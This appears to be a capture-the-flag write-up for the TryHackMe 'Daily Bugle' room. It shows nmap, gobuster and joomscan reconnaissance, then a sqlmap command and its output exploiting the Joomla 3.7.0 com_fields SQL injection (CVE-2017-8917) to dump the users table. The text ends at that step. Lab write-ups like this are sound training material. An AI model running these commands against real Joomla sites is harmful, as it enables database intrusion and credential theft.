# Daily Bugle
* Compromise Joomla CMS account using SQLi, crack hashes and escalate privileges by taking advantage of "yum".
## Scan using Nmap
```
nmap -Pn -O -p- -sV -sC -oN TARGET_IP_scan.nmap TARGET_IP
```
  * `-sC` scan with default NSE scripts.
    * Considered useful for discovery and safe.
```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-03-01 23:46 GMT
Warning: 10.10.208.89 giving up on port because retransmission cap hit (2).
Host is up (0.00037s latency).
Not shown: 65527 closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (EdDSA)
80/tcp    open     http       Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
1157/tcp  filtered iascontrol
3306/tcp  open     mysql      MariaDB (unauthorized)
17194/tcp filtered unknown
36586/tcp filtered unknown
62839/tcp filtered unknown
65431/tcp filtered unknown
MAC Address: 02:B7:92:4A:42:3F (Unknown)
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 (92%), Linux 3.19 (92%), Linux 3.2 - 4.8 (92%), Linux 3.4 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.91 seconds
```
### Use GoBuster to search for hidden directories.
```
gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt > gobuster.txt

[snip...]
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)
/index.php (Status: 200)
/templates (Status: 301)
/tmp (Status: 301)
[snip...]
```
* Browse to "/administrator" directory reveals Joomla login screen.

![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/078787b0-7303-4d8a-aac2-6bc911135f12)
  * Default Joomla username admin with no password credentials do not work.
* All other Gobuster discovered directories return no information.
* Internet search found [OWASP JoomScan](https://github.com/OWASP/joomscan) Joomla! Vulnerability Scanner.
```
git clone https://github.com/rezasp/joomscan.git
perl joomscan/joomscan.pl -u http://TARGET_IP
```
  * Scan returned Joomla version 3.7.0.
### Search searchsploit for exploits affecting Joomla! 3.7.0
```
searchsploit joomla 3.7.0
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection    | php/webapps/42033.txt
```
* [Joomla! 3.7.0 - 'com_fields' SQL Injection](https://www.exploit-db.com/exploits/42033).
> Using Sqlmap: `sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`.
* Exploit associated with [CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917).
> SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute arbitrary SQL commands via unspecified vectors.
### Exploit Joomla! database using SQLMap method
```
sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
[snip...]
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[snip...]
sqlmap got a 303 redirect to 'http://10.10.13.128:80/index.php/component/fields/'. Do you want to follow? [Y/n]  n
[snip...]

```

-D joomla -T '#__users' --dump
